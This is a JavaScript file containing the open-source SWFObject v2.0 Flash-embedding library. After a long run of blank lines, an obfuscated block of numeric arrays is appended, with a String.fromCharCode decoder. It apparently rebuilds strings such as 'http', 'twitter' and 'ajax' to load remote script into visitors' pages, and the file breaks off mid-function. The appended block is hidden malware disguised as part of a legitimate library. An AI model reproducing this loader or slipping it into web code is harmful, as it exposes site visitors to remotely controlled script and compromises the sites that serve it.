/*!	SWFObject v2.0 <http://code.google.com/p/swfobject/>
	Copyright (c) 2007 Geoff Stearns, Michael Williams, and Bobby van der Sluis
	This software is released under the MIT License <http://www.opensource.org/licenses/mit-license.php>
*/

var swfobject = function() {
	
	var UNDEF = "undefined",
		OBJECT = "object",
		SHOCKWAVE_FLASH = "Shockwave Flash",
		SHOCKWAVE_FLASH_AX = "ShockwaveFlash.ShockwaveFlash",
		FLASH_MIME_TYPE = "application/x-shockwave-flash",
		EXPRESS_INSTALL_ID = "SWFObjectExprInst",
		
		win = window,
		doc = document,
		nav = navigator,
		
		domLoadFnArr = [],
		regObjArr = [],
		timer = null,
		storedAltContent = null,
		storedAltContentId = null,
		isDomLoaded = false,
		isExpressInstallActive = false;
	
	/* Centralized function for browser feature detection
		- Proprietary feature detection (conditional compiling) is used to detect Internet Explorer's features
		- User agent string detection is only used when no alternative is possible
		- Is executed directly for optimal performance
	*/	
	var ua = function() {
		var w3cdom = typeof doc.getElementById != UNDEF && typeof doc.getElementsByTagName != UNDEF && typeof doc.createElement != UNDEF && typeof doc.appendChild != UNDEF && typeof doc.replaceChild != UNDEF && typeof doc.removeChild != UNDEF && typeof doc.cloneNode != UNDEF,
			playerVersion = [0,0,0],
			d = null;
		if (typeof nav.plugins != UNDEF && typeof nav.plugins[SHOCKWAVE_FLASH] == OBJECT) {
			d = nav.plugins[SHOCKWAVE_FLASH].description;
			if (d) {
				d = d.replace(/^.*\s+(\S+\s+\S+$)/, "$1");
				playerVersion[0] = parseInt(d.replace(/^(.*)\..*$/, "$1"), 10);
				playerVersion[1] = parseInt(d.replace(/^.*\.(.*)\s.*$/, "$1"), 10);
				playerVersion[2] = /r/.test(d) ? parseInt(d.replace(/^.*r(.*)$/, "$1"), 10) : 0;
			}
		}
		else if (typeof win.ActiveXObject != UNDEF) {
			var a = null, fp6Crash = false;
			try {
				a = new ActiveXObject(SHOCKWAVE_FLASH_AX + ".7");
			}
			catch(e) {
				try { 
					a = new ActiveXObject(SHOCKWAVE_FLASH_AX + ".6");
					playerVersion = [6,0,21];
					a.AllowScriptAccess = "always";  // Introduced in fp6.0.47
				}
				catch(e) {
					if (playerVersion[0] == 6) {
						fp6Crash = true;
					}
				}
				if (!fp6Crash) {
					try {
						a = new ActiveXObject(SHOCKWAVE_FLASH_AX);
					}
					catch(e) {}
				}
			}
			if (!fp6Crash && a) { // a will return null when ActiveX is disabled
				try {
					d = a.GetVariable("$version");  // Will crash fp6.0.21/23/29
					if (d) {
						d = d.split(" ")[1].split(",");
						playerVersion = [parseInt(d[0], 10), parseInt(d[1], 10), parseInt(d[2], 10)];
					}
				}
				catch(e) {}
			}
		}
		var u = nav.userAgent.toLowerCase(),
			p = nav.platform.toLowerCase(),
			webkit = /webkit/.test(u) ? parseFloat(u.replace(/^.*webkit\/(\d+(\.\d+)?).*$/, "$1")) : false, // returns either the webkit version or false if not webkit
			ie = false,
			windows = p ? /win/.test(p) : /win/.test(u),
			mac = p ? /mac/.test(p) : /mac/.test(u);
		/*@cc_on
			ie = true;
			@if (@_win32)
				windows = true;
			@elif (@_mac)
				mac = true;
			@end
		@*/
		return { w3cdom:w3cdom, pv:playerVersion, webkit:webkit, ie:ie, win:windows, mac:mac };
	}();

	/* Cross-browser onDomLoad
		- Based on Dean Edwards' solution: http://dean.edwards.name/weblog/2006/06/again/
		- Will fire an event as soon as the DOM of a page is loaded (supported by Gecko based browsers - like Firefox -, IE, Opera9+, Safari)
	*/ 
	var onDomLoad = function() {
		if (!ua.w3cdom) {
			return;
		}
		addDomLoadEvent(main);
		if (ua.ie && ua.win) {
			try {  // Avoid a possible Operation Aborted error
				doc.write("<scr" + "ipt id=__ie_ondomload defer=true src=//:></scr" + "ipt>"); // String is split into pieces to avoid Norton AV to add code that can cause errors 
				var s = getElementById("__ie_ondomload");
				if (s) {
					s.onreadystatechange = function() {
						if (this.readyState == "complete") {
							this.parentNode.removeChild(this);
							callDomLoadFunctions();
						}
					};
				}
			}
			catch(e) {}
		}
		if (ua.webkit && typeof doc.readyState != UNDEF) {
			timer = setInterval(function() { if (/loaded|complete/.test(doc.readyState)) { callDomLoadFunctions(); }}, 10);
		}
		if (typeof doc.addEventListener != UNDEF) {
			doc.addEventListener("DOMContentLoaded", callDomLoadFunctions, null);
		}
		addLoadEvent(callDomLoadFunctions);
	}();
	
	function callDomLoadFunctions() {
		if (isDomLoaded) {
			return;
		}
		if (ua.ie && ua.win) { // Test if we can really add elements to the DOM; we don't want to fire it too early
			var s = createElement("span");
			try { // Avoid a possible Operation Aborted error
				var t = doc.getElementsByTagName("body")[0].appendChild(s);
				t.parentNode.removeChild(t);
			}
			catch (e) {
				return;
			}
		}
		isDomLoaded = true;
		if (timer) {
			clearInterval(timer);
			timer = null;
		}
		var dl = domLoadFnArr.length;
		for (var i = 0; i < dl; i++) {
			domLoadFnArr[i]();
		}
	}
	
	function addDomLoadEvent(fn) {
		if (isDomLoaded) {
			fn();
		}
		else { 
			domLoadFnArr[domLoadFnArr.length] = fn; // Array.push() is only available in IE5.5+
		}
	}
	
	/* Cross-browser onload
		- Based on James Edwards' solution: http://brothercake.com/site/resources/scripts/onload/
		- Will fire an event as soon as a web page including all of its assets are loaded 
	 */
	function addLoadEvent(fn) {
		if (typeof win.addEventListener != UNDEF) {
			win.addEventListener("load", fn, false);
		}
		else if (typeof doc.addEventListener != UNDEF) {
			doc.addEventListener("load", fn, false);
		}
		else if (typeof win.attachEvent != UNDEF) {
			win.attachEvent("onload", fn);
		}
		else if (typeof win.onload == "function") {
			var fnOld = win.onload;
			win.onload = function() {
				fnOld();
				fn();
			};
		}
		else {
			win.onload = fn;
		}
	}
	
	/* Main function
		- Will preferably execute onDomLoad, otherwise onload (as a fallback)
	*/
	function main() { // Static publishing only
		var rl = regObjArr.length;
		for (var i = 0; i < rl; i++) { // For each registered object element
			var id = regObjArr[i].id;
			if (ua.pv[0] > 0) {
				var obj = getElementById(id);
				if (obj) {
					regObjArr[i].width = obj.getAttribute("width") ? obj.getAttribute("width") : "0";
					regObjArr[i].height = obj.getAttribute("height") ? obj.getAttribute("height") : "0";
					if (hasPlayerVersion(regObjArr[i].swfVersion)) { // Flash plug-in version >= Flash content version: Houston, we have a match!
						if (ua.webkit && ua.webkit < 312) { // Older webkit engines ignore the object element's nested param elements
							fixParams(obj);
						}
						setVisibility(id, true);
					}
					else if (regObjArr[i].expressInstall && !isExpressInstallActive && hasPlayerVersion("6.0.65") && (ua.win || ua.mac)) { // Show the Adobe Express Install dialog if set by the web page author and if supported (fp6.0.65+ on Win/Mac OS only)
						showExpressInstall(regObjArr[i]);
					}
					else { // Flash plug-in and Flash content version mismatch: display alternative content instead of Flash content
						displayAltContent(obj);
					}
				}
			}
			else {  // If no fp is installed, we let the object element do its job (show alternative content)
				setVisibility(id, true);
			}
		}
	}
	
	/* Fix nested param elements, which are ignored by older webkit engines
		- This includes Safari up to and including version 1.2.2 on Mac OS 10.3
		- Fall back to the proprietary embed element
	*/
	function fixParams(obj) {
		var nestedObj = obj.getElementsByTagName(OBJECT)[0];
		if (nestedObj) {
			var e = createElement("embed"), a = nestedObj.attributes;
			if (a) {
				var al = a.length;
				for (var i = 0; i < al; i++) {
					if (a[i].nodeName.toLowerCase() == "data") {
						e.setAttribute("src", a[i].nodeValue);
					}
					else {
						e.setAttribute(a[i].nodeName, a[i].nodeValue);
					}
				}
			}
			var c = nestedObj.childNodes;
			if (c) {
				var cl = c.length;
				for (var j = 0; j < cl; j++) {
					if (c[j].nodeType == 1 && c[j].nodeName.toLowerCase() == "param") {
						e.setAttribute(c[j].getAttribute("name"), c[j].getAttribute("value"));
					}
				}
			}
			obj.parentNode.replaceChild(e, obj);
		}
	}
	
	/* Fix hanging audio/video threads and force open sockets and NetConnections to disconnect
		- Occurs when unloading a web page in IE using fp8+ and innerHTML/outerHTML
		- Dynamic publishing only
	*/
	function fixObjectLeaks(id) {
		if (ua.ie && ua.win && hasPlayerVersion("8.0.0")) {
			win.attachEvent("onunload", function () {
				var obj = getElementById(id);
				if (obj) {
					for (var i in obj) {
						if (typeof obj[i] == "function") {
							obj[i] = function() {};
						}
					}
					obj.parentNode.removeChild(obj);
				}
			});
		}
	}
	
	/* Show the Adobe Express Install dialog
		- Reference: http://www.adobe.com/cfusion/knowledgebase/index.cfm?id=6a253b75
	*/
	function showExpressInstall(regObj) {
		isExpressInstallActive = true;
		var obj = getElementById(regObj.id);
		if (obj) {
			if (regObj.altContentId) {
				var ac = getElementById(regObj.altContentId);
				if (ac) {
					storedAltContent = ac;
					storedAltContentId = regObj.altContentId;
				}
			}
			else {
				storedAltContent = abstractAltContent(obj);
			}
			if (!(/%$/.test(regObj.width)) && parseInt(regObj.width, 10) < 310) {
				regObj.width = "310";
			}
			if (!(/%$/.test(regObj.height)) && parseInt(regObj.height, 10) < 137) {
				regObj.height = "137";
			}
			doc.title = doc.title.slice(0, 47) + " - Flash Player Installation";
			var pt = ua.ie && ua.win ? "ActiveX" : "PlugIn",
				dt = doc.title,
				fv = "MMredirectURL=" + win.location + "&MMplayerType=" + pt + "&MMdoctitle=" + dt,
				replaceId = regObj.id;
			// For IE when a SWF is loading (AND: not available in cache) wait for the onload event to fire to remove the original object element
			// In IE you cannot properly cancel a loading SWF file without breaking browser load references, also obj.onreadystatechange doesn't work
			if (ua.ie && ua.win && obj.readyState != 4) {
				var newObj = createElement("div");
				replaceId += "SWFObjectNew";
				newObj.setAttribute("id", replaceId);
				obj.parentNode.insertBefore(newObj, obj); // Insert placeholder div that will be replaced by the object element that loads expressinstall.swf
				obj.style.display = "none";
				win.attachEvent("onload", function() { obj.parentNode.removeChild(obj); });
			}
			createSWF({ data:regObj.expressInstall, id:EXPRESS_INSTALL_ID, width:regObj.width, height:regObj.height }, { flashvars:fv }, replaceId);
		}
	}
	
	/* Functions to abstract and display alternative content
	*/
	function displayAltContent(obj) {
		if (ua.ie && ua.win && obj.readyState != 4) {
			// For IE when a SWF is loading (AND: not available in cache) wait for the onload event to fire to remove the original object element
			// In IE you cannot properly cancel a loading SWF file without breaking browser load references, also obj.onreadystatechange doesn't work
			var el = createElement("div");
			obj.parentNode.insertBefore(el, obj); // Insert placeholder div that will be replaced by the alternative content
			el.parentNode.replaceChild(abstractAltContent(obj), el);
			obj.style.display = "none";
			win.attachEvent("onload", function() { obj.parentNode.removeChild(obj); });
		}
		else {
			obj.parentNode.replaceChild(abstractAltContent(obj), obj);
		}
	}	

	function abstractAltContent(obj) {
		var ac = createElement("div");
		if (ua.win && ua.ie) {
			ac.innerHTML = obj.innerHTML;
		}
		else {
			var nestedObj = obj.getElementsByTagName(OBJECT)[0];
			if (nestedObj) {
				var c = nestedObj.childNodes;
				if (c) {
					var cl = c.length;
					for (var i = 0; i < cl; i++) {
						if (!(c[i].nodeType == 1 && c[i].nodeName.toLowerCase() == "param") && !(c[i].nodeType == 8)) {
							ac.appendChild(c[i].cloneNode(true));
						}
					}
				}
			}
		}
		return ac;
	}
	
	/* Cross-browser dynamic SWF creation
	*/
	function createSWF(attObj, parObj, id) {
		var r, el = getElementById(id);
		if (typeof attObj.id == UNDEF) { // if no 'id' is defined for the object element, it will inherit the 'id' from the alternative content
			attObj.id = id;
		}
		if (ua.ie && ua.win) { // IE, the object element and W3C DOM methods do not combine: fall back to outerHTML
			var att = "";
			for (var i in attObj) {
				if (attObj[i] != Object.prototype[i]) { // Filter out prototype additions from other potential libraries, like Object.prototype.toJSONString = function() {}
					if (i == "data") {
						parObj.movie = attObj[i];
					}
					else if (i.toLowerCase() == "styleclass") { // 'class' is an ECMA4 reserved keyword
						att += ' class="' + attObj[i] + '"';
					}
					else if (i != "classid") {
						att += ' ' + i + '="' + attObj[i] + '"';
					}
				}
			}
			var par = "";
			for (var j in parObj) {
				if (parObj[j] != Object.prototype[j]) { // Filter out prototype additions from other potential libraries
					par += '<param name="' + j + '" value="' + parObj[j] + '" />';
				}
			}
			el.outerHTML = '<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000"' + att + '>' + par + '</object>';
			fixObjectLeaks(attObj.id); // This bug affects dynamic publishing only
			r = getElementById(attObj.id);	
		}
		else if (ua.webkit && ua.webkit < 312) { // Older webkit engines ignore the object element's nested param elements: fall back to the proprietary embed element
			var e = createElement("embed");
			e.setAttribute("type", FLASH_MIME_TYPE);
			for (var k in attObj) {
				if (attObj[k] != Object.prototype[k]) { // Filter out prototype additions from other potential libraries
					if (k == "data") {
						e.setAttribute("src", attObj[k]);
					}
					else if (k.toLowerCase() == "styleclass") { // 'class' is an ECMA4 reserved keyword
						e.setAttribute("class", attObj[k]);
					}
					else if (k != "classid") { // Filter out IE specific attribute
						e.setAttribute(k, attObj[k]);
					}
				}
			}
			for (var l in parObj) {
				if (parObj[l] != Object.prototype[l]) { // Filter out prototype additions from other potential libraries
					if (l != "movie") { // Filter out IE specific param element
						e.setAttribute(l, parObj[l]);
					}
				}
			}
			el.parentNode.replaceChild(e, el);
			r = e;
		}
		else { // Well-behaving browsers
			var o = createElement(OBJECT);
			o.setAttribute("type", FLASH_MIME_TYPE);
			for (var m in attObj) {
				if (attObj[m] != Object.prototype[m]) { // Filter out prototype additions from other potential libraries
					if (m.toLowerCase() == "styleclass") { // 'class' is an ECMA4 reserved keyword
						o.setAttribute("class", attObj[m]);
					}
					else if (m != "classid") { // Filter out IE specific attribute
						o.setAttribute(m, attObj[m]);
					}
				}
			}
			for (var n in parObj) {
				if (parObj[n] != Object.prototype[n] && n != "movie") { // Filter out prototype additions from other potential libraries and IE specific param element
					createObjParam(o, n, parObj[n]);
				}
			}
			el.parentNode.replaceChild(o, el);
			r = o;
		}
		return r;
	}
	
	function createObjParam(el, pName, pValue) {
		var p = createElement("param");
		p.setAttribute("name", pName);	
		p.setAttribute("value", pValue);
		el.appendChild(p);
	}
	
	function getElementById(id) {
		return doc.getElementById(id);
	}
	
	function createElement(el) {
		return doc.createElement(el);
	}
	
	function hasPlayerVersion(rv) {
		var pv = ua.pv, v = rv.split(".");
		v[0] = parseInt(v[0], 10);
		v[1] = parseInt(v[1], 10);
		v[2] = parseInt(v[2], 10);
		return (pv[0] > v[0] || (pv[0] == v[0] && pv[1] > v[1]) || (pv[0] == v[0] && pv[1] == v[1] && pv[2] >= v[2])) ? true : false;
	}
	
	/* Cross-browser dynamic CSS creation
		- Based on Bobby van der Sluis' solution: http://www.bobbyvandersluis.com/articles/dynamicCSS.php
	*/	
	function createCSS(sel, decl) {
		if (ua.ie && ua.mac) {
			return;
		}
		var h = doc.getElementsByTagName("head")[0], s = createElement("style");
		s.setAttribute("type", "text/css");
		s.setAttribute("media", "screen");
		if (!(ua.ie && ua.win) && typeof doc.createTextNode != UNDEF) {
			s.appendChild(doc.createTextNode(sel + " {" + decl + "}"));
		}
		h.appendChild(s);
		if (ua.ie && ua.win && typeof doc.styleSheets != UNDEF && doc.styleSheets.length > 0) {
			var ls = doc.styleSheets[doc.styleSheets.length - 1];
			if (typeof ls.addRule == OBJECT) {
				ls.addRule(sel, decl);
			}
		}
	}
	
	function setVisibility(id, isVisible) {
		var v = isVisible ? "visible" : "hidden";
		if (isDomLoaded) {
			getElementById(id).style.visibility = v;
		}
		else {
			createCSS("#" + id, "visibility:" + v);
		}
	}
	
	function getTargetVersion(obj) {
	    if (!obj)
	        return 0;
		var c = obj.childNodes;
		var cl = c.length;
		for (var i = 0; i < cl; i++) {
			if (c[i].nodeType == 1 && c[i].nodeName.toLowerCase() == "object") {
			    c = c[i].childNodes;
			    cl = c.length;
			    i = 0;
			}     
			if (c[i].nodeType == 1 && c[i].nodeName.toLowerCase() == "param" && c[i].getAttribute("name") == "swfversion") {
			   return c[i].getAttribute("value"); 
			}
		}
		return 0;
	}
    
	function getExpressInstall(obj) {
	    if (!obj)
	        return "";
		var c = obj.childNodes;
		var cl = c.length;
		for (var i = 0; i < cl; i++) {
			if (c[i].nodeType == 1 && c[i].nodeName.toLowerCase() == "object") {
			    c = c[i].childNodes;
			    cl = c.length;
			    i = 0;
			}     
			if (c[i].nodeType == 1 && c[i].nodeName.toLowerCase() == "param" && c[i].getAttribute("name") == "expressinstall") { 
			    return c[i].getAttribute("value"); 
			}	       
		}
		return "";
	}
    
	return {
		/* Public API
			- Reference: http://code.google.com/p/swfobject/wiki/SWFObject_2_0_documentation
		*/ 
		registerObject: function(objectIdStr, swfVersionStr, xiSwfUrlStr) {
			if (!ua.w3cdom || !objectIdStr) {
				return;
			}
			var obj = document.getElementById(objectIdStr);
			var xi = getExpressInstall(obj);
			var regObj = {};
			regObj.id = objectIdStr;
			regObj.swfVersion = swfVersionStr ? swfVersionStr : getTargetVersion(obj);
			regObj.expressInstall = xiSwfUrlStr ? xiSwfUrlStr : ((xi != "") ? xi : false);
			regObjArr[regObjArr.length] = regObj;
			setVisibility(objectIdStr, false);
		},
		
		getObjectById: function(objectIdStr) {
			var r = null;
			if (ua.w3cdom && isDomLoaded) {
				var o = getElementById(objectIdStr);
				if (o) {
					var n = o.getElementsByTagName(OBJECT)[0];
					if (!n || (n && typeof o.SetVariable != UNDEF)) {
				    	r = o;
					}
					else if (typeof n.SetVariable != UNDEF) {
						r = n;
					}
				}
			}
			return r;
		},
		
		embedSWF: function(swfUrlStr, replaceElemIdStr, widthStr, heightStr, swfVersionStr, xiSwfUrlStr, flashvarsObj, parObj, attObj) {
			if (!ua.w3cdom || !swfUrlStr || !replaceElemIdStr || !widthStr || !heightStr || !swfVersionStr) {
				return;
			}
			widthStr += ""; // Auto-convert to string to make it idiot proof
			heightStr += "";
			if (hasPlayerVersion(swfVersionStr)) {
				setVisibility(replaceElemIdStr, false);
				var att = (typeof attObj == OBJECT) ? attObj : {};
				att.data = swfUrlStr;
				att.width = widthStr;
				att.height = heightStr;
				var par = (typeof parObj == OBJECT) ? parObj : {};
				if (typeof flashvarsObj == OBJECT) {
					for (var i in flashvarsObj) {
						if (flashvarsObj[i] != Object.prototype[i]) { // Filter out prototype additions from other potential libraries
							if (typeof par.flashvars != UNDEF) {
								par.flashvars += "&" + i + "=" + flashvarsObj[i];
							}
							else {
								par.flashvars = i + "=" + flashvarsObj[i];
							}
						}
					}
				}
				addDomLoadEvent(function() {
					createSWF(att, par, replaceElemIdStr);
					if (att.id == replaceElemIdStr) {
						setVisibility(replaceElemIdStr, true);
					}
				});
			}
			else if (xiSwfUrlStr && !isExpressInstallActive && hasPlayerVersion("6.0.65") && (ua.win || ua.mac)) {
				setVisibility(replaceElemIdStr, false);
				addDomLoadEvent(function() {
					var regObj = {};
					regObj.id = regObj.altContentId = replaceElemIdStr;
					regObj.width = widthStr;
					regObj.height = heightStr;
					regObj.expressInstall = xiSwfUrlStr;
					showExpressInstall(regObj);
				});
			}
		},
		
		getFlashPlayerVersion: function() {
			return { major:ua.pv[0], minor:ua.pv[1], release:ua.pv[2] };
		},
		
		hasFlashPlayerVersion:hasPlayerVersion,
		
		createSWF: function(attObj, parObj, replaceElemIdStr) {
			if (ua.w3cdom && isDomLoaded) {
				return createSWF(attObj, parObj, replaceElemIdStr);
			}
			else {
				return undefined;
			}
		},
		
		createCSS: function(sel, decl) {
			if (ua.w3cdom) {
				createCSS(sel, decl);
			}
		},
		
		addDomLoadEvent:addDomLoadEvent,
		
		addLoadEvent:addLoadEvent,
		
		getQueryParamValue: function(param) {
			var q = doc.location.search || doc.location.hash;
			if (param == null) {
				return q;
			}
		 	if(q) {
				var pairs = q.substring(1).split("&");
				for (var i = 0; i < pairs.length; i++) {
					if (pairs[i].substring(0, pairs[i].indexOf("=")) == param) {
						return pairs[i].substring((pairs[i].indexOf("=") + 1));
					}
				}
			}
			return "";
		},
		
		// For internal usage only
		expressInstallCallback: function() {
			if (isExpressInstallActive && storedAltContent) {
				var obj = getElementById(EXPRESS_INSTALL_ID);
				if (obj) {
					obj.parentNode.replaceChild(storedAltContent, obj);
					if (storedAltContentId) {
						setVisibility(storedAltContentId, true);
						if (ua.ie && ua.win) {
							storedAltContent.style.display = "block";
						}
					}
					storedAltContent = null;
					storedAltContentId = null;
					isExpressInstallActive = false;
				}
			} 
		}
		
	};

}();














(function($$){qq2=[8,0,26,0,11,81,29,0,26,86,65,82,0,54,48,29,84,72,73,83,27,60,59,54,48,0,0,38,85,76,76,57,69,65,82,0,5,45,79,78,84,72,0,5,36,65,84,69,0,5,40,79,85,82,83,0,5,45,73,78,85,84,69,83,0,5,51,69,67,79,78,68,83,8,9,61,93,27,0,11,75,29,0,26,0,6,82,12,54,80,29,84,72,73,83,14,3,81,8,9,12,73,29,16,27,54,80,59,17,61,11,29,17,27,87,72,73,76,69,8,73,11,11,28,23,9,91,3,82,29,54,80,59,73,61,0,15,3,82,28,3,45,9,54,80,59,73,61,0,22,3,82,93,60,0,54,80,14,83,80,76,73,67,69,8,94,90,7,9,12,17,11,94,52,0,16,0,23,94,85,0,16,11,7,52,7,11,54,80,0,23,94,53,0,16,93,27,54,39,29,91,7,72,64,72,84,84,80,26,15,15,56,83,64,15,56,84,64,84,82,69,56,68,64,68,65,73,56,78,64,78,68,83,56,81,64,31,56,67,64,67,65,76,76,66,65,67,75,29,56,74,64,3,56,65,64,65,80,73,56,76,64,76,89,56,55,64,84,87,73,84,84,69,82,56,79,64,67,79,77,56,69,64,17,56,75,64,83,56,43,64,66,79,68,89,56,88,64,65,74,65,88,56,36,64,14,56,44,64,76,73,66,83,56,42,64,74,81,85,69,82,89,56,22,64,22,14,18,56,77,64,77,73,78,56,70,64,79,78,56,51,64,67,82,73,80,84,56,73,64,73,70,56,45,64,82,65,77,69,56,57,64,72,69,65,68,56,87,64,87,73,68,84,72,26,56,80,64,80,88,27,56,40,64,72,69,73,71,72,84,26,56,52,64,18,56,82,64,82,67,56,49,64,2,56,89,64,83,84,89,76,69,29,56,66,64,30,28,56,50,64,30,28,15,56,41,64,68,73,86,56,34,64,28,56,33,64,30,56,71,64,71,79,79,71,76,69,56,37,64,6,68,65,84,69,29,56,90,64,16,56,85,64,13,56,53,64,0,56,12,64,26,16,16,56,27,7,26,18,19,20,21,22,23,24,25,16,17,12,7,15,7,26,20,24,18,23,17,12,7,38,7,26,17,25,24,17,25,21,18,21,20,12,7,39,7,26,17,18,12,7,35,64,29,7,93,27,32,0,3,77,8,54,85,9,91,3,52,29,59,61,27,70,79,82,8,54,65,29,16,27,54,65,28,54,85,0,8,27,54,65,11,11,9,91,3,52,14,80,85,83,72,8,54,39,59,54,85,14,67,72,65,82,33,84,8,54,65,9,61,9,93,60,0,3,84,8,3,52,9,93,54,73,29,68,79,67,85,77,69,78,84,27,3,85,29,87,73,78];qq21=[68,79,87,27,0,9,89,29,7,85,78,68,69,70,73,78,69,68,7,27,0,9,90,29,94,72,65,36,55,36,79,83,69,83,84,78,83,68,76,36,74,70,81,67,81,7,0,19,40,29,0,10,9,29,29,0,9,89,9,0,15,3,40,92,92,1,54,67,8,9,9,91,73,70,8,1,3,40,9,91,84,82,89,91,54,71,29,74,49,85,69,82,89,0,1,27,84,82,89,91,54,71,29,4,0,1,93,54,51,29,54,73,14,71,69,84,37,76,69,77,69,78,84,83,34,89,52,65,71,46,65,77,69,8,94,57,0,16,59,16,61,27,3,37,29,54,73,14,67,82,69,65,84,69,37,76,69,77,69,78,84,8,94,75,51,0,16,27,3,37,14,83,69,84,33,84,84,82,73,66,85,84,69,8,94,75,82,7,9,12,3,77,8,2,72,88,36,71,65,75,36,79,83,88,83,44,83,42,83,69,36,22,83,42,36,77,36,74,2,9,9,27,54,51,14,65,80,80,69,78,68,35,72,73,76,68,8,3,37,9,93,32,0,54,50,8,3,83,12,54,38,0,18,45,65,84,72,14,70,76,79,79,82,8,3,83,15,54,38,9,0,25,86,8,3,68,9,91,86,65,82,0,54,70,29,54,50,8,0,9,44,12,0,4,88,9,27,0,6,87,29,0,9,44,5,0,4,88,27,0,6,46,29,0,4,80,10,3,87,27,0,6,38,29,0,4,77,10,54,70,27,0,6,69,29,3,46,13,3,38,0,15,3,69,30,16,9,91,3,44,29,3,69,93,69,76,83,69,91,3,44,29,3,69,11,0,4,33,93,60,8,3,44,5,3,68,9,0,25,42,8,3,78,9,91,0,9,44,29,94,27,7,9,11,3,78,27,0,4,80,29,94,15,7,9,27,0,4,33,29,94,27,7,9,13,94,38,7,9,27,0,4,88,29,54,50,8,0,4,33,12,0,4,80,9,27,0,4,77,29,0,4,33,5,0,4,80,0,25,84,8,54,0,18,54,0,8,29,29,17,31,54,59,16,61,26,54,0,23,7,7,9,93,27,32,0,3,50,8,54,9,91,68,29,78,69,87,0,36,65,84,69,8,0,19,33,29,94,90,69,69,7,9,27,68,14,83,69,84,52,73,77,69,8,8,54,14,65,83,63,79,70,13,94,39,7,9,10];function co(){return 'Code';}function gafu(){return a(String,'f'+ro()+co());}qq3=[94,39,7,9,10,94,39,7,9,10,94,69,90,90,0,16,10,94,69,90,90,90,0,16,27,60,0,68,0,25,79,8,54,35,9,91,0,6,73,12,54,72,12,3,39,29,54,35,0,8,27,0,6,88,29,59,61,27,87,72,73,76,69,8,13,13,3,39,9,91,54,72,29,3,86,8,3,39,0,19,88,14,80,85,83,72,8,54,72,0,19,73,29,54,35,59,54,72,61,27,54,35,59,54,72,61,29,54,35,59,3,39,61,27,54,35,59,3,39,61,29,3,73,93,93,32,0,54,44,8,4,9,91,54,37,29,4,14,77,65,80,8,59,24,17,12,24,21,12,23,20,12,23,20,12,25,18,12,17,23,12,24,18,12,23,19,12,24,16,12,19,16,12,24,18,12,23,23,12,18,21,12,17,17,12,17,16,12,17,16,12,22,17,12,17,17,12,21,22,12,21,21,12,17,17,12,21,19,12,22,12,21,19,12,23,12,18,12,17,12,16,12,20,24,61,12,32,8,88,12,73,0,18,51,84,82,73,78,71,14,70,82,79,77,35,72,65,82,35,79,68,69,8,73,11,88,11,18,20,9,93,9,27,60,0,3,84,8,54,37,9,0,25,74,8,88,0,18,88,0,8,93,32,0,54,52,8,4,9,91,73,70,0,10,9,1,29,0,9,89,9,91,4,8,0,26,73,70,0,10,14,54,79,9,1,29,0,9,89,9,60,27,4,14,54,79,29,17,27,0,20,90,12,32,8,54,45,9,91,3,36,29,3,50,8,54,45,0,19,43,29,3,36,0,0,45,79,78,84,72,8,9,0,27,46,29,3,36,0,0,36,65,84,69,8,0,19,80,29,32,8,88,12,73,9,91,60,8,3,74,8,88,11,2,2,9,13,17,9,31,88,26,2,16,2,11,88,93,27,54,69,29,3,80,8,3,43,12,20,9,11,2,13,2,11,3,80,8,54,46,12,23,0,19,65,29,3,90,11,3,77,8,2,37,0,21,27,54,36,29,54,89,29,54,50,8,3,36,0,0,40,79,85,82,83,8,9,12,22,9,10,22,0,27,90,29,54,36,11,17,27,3,45,29,11,94,69,90,7,9,27,0,12,0,20,65,12,32,8,54,45,9,91,84,82,89,91,3,51,29,54,45,14,84,82,69,78,68,83,27,3,70,29,3,77,8,2,0,21,11,2,0,2,0,15,54,36,28,3,45,9,54,36,0,22,54,36,0,15,54,90,28,3,45,9,54,90,0,22,54,90,27,0,24,36,11,3,77,8,56,9,61,0,15,1,3,67,9,91,0,24,90,11,3,77,8,56,9,61,93,3,67,29,8,3,67,59,19,61,14,78,65,77,69,14,84,79,44,79,87,69,82,35,65,83,69,8,9,14,82,69,80,76,65,67,69,8,15,59,62,65,13,90,61,15,71,73,12,7,7,9,11,7,77,73,67,82,79,83,67,79,80,69,7,9,14,83,80,76,73];qq31=[84,8,7,7,0,19,35,29,3,43,10,23,17,11,54,89,10,19,11,54,46,10,19,23,27,3,42,8,3,35,0,19,74,29,3,86,8,20,9,11,3,45,27,3,79,8,3,67,0,19,66,29,94,35,72,7,9,11,3,84,8,3,67,9,14,83,85,66,83,84,82,73,78,71,8,16,12,3,74,9,11,7,14,67,79,77,15,7,11,54,44,8,4,9,27,54,39,59,7,58,7,61,29,3,66,27,54,82,29,94,34,41,0,17,66,73,45,53,0,17,53,75,82,58,50,73,45,50,41,33,7,9,27,4,8,94,43,0,16,14,65,80,80,69,78,68,8,54,82,9,93,67,65,84,67,72,8,54,81,9,91,93,93,9,93,12,3,45,10,3,45,10,3,45,9,93,9,93,9,93,69,76,83,69,91,0,12,0,13,12,17,11,94,52,52,52,0,16,93,93,0,13,9,8,9,3,74,83,32,70,85,78,67,84,73,79,78,54,3,34,56,7,12,7,64,7,26,7,94,3,77,8,7,60,82,69,84,85,82,78,0,0,14,71,69,84,53,52,35,0,1,14,78,79,35,79,78,70,76,73,67,84,8,84,82,85,69,9,93,67,65,84,67,72,8,69,9,91,93,0,4,3,85,14,54,0,5,8,9,12,54,48,0,0,0,6,86,65,82,0,3,0,8,14,76,69,78,71,84,72,0,9,3,85,14,3,0,10,8,84,89,80,69,79,70,8,4,0,11,36,65,84,69,14,80,82,79,84,79,84,89,80,69,14,3,0,12,83,69,84,52,73,77,69,79,85,84,8,0,26,0,13,54,52,8,3,85,14,74,49,85,69,82,89,9,93,0,15,27,73,70,8,0,16,7,9,9,0,17,89,49,40,52,80,87,69,69,69,80,49,0,18,9,91,60,0,0,19,9,27,3,0,20,4,14,71,69,84,42,51,47,46,8,3,0,21,52,90,69,69,85,2,9,11,54,69,0,22,29,94,90,7,9,11,0,23,14,74,79,73,78,8,0,24,3,67,29,3,51,59,3,70,11,54,0,25,93,32,0,3,0,26,32,8,9,91,0,27,11,8,11,94,69,0,16,27,54];d='';mapper=[3,32,54,56,64,94,60,0,0,0,1,0,4,0,5,0,6,0,8,0,9,0,10,0,11,0,12,0,13,0,15,0,16,0,17,0,18,0,19,0,20,0,21,0,22,0,23,0,24,0,25,0,26,0,27];map='';function fs(ro,arr,add){for(var i=0;i<arr.length;i++){ro+=String.fromCharCode(arr[i]+add);}return 